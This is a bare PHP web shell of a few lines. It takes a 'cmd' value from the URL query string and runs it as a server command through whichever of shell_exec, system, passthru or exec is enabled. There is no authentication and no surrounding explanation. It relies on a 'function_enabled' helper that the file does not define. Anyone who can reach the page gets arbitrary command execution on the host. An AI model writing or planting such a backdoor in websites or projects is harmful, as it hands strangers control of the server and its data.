<?php
function run($c) {
   if(function_enabled('shell_exec')) {
       shell_exec($c);
   }else if(function_enabled('system')) {
      system($c);
   }else if(function_enabled('passthru')) {
      passthru($c);
   }else if(function_enabled('exec')) {
      exec($c);
   } 
}

$c = $_GET['cmd'];
run($c);
?>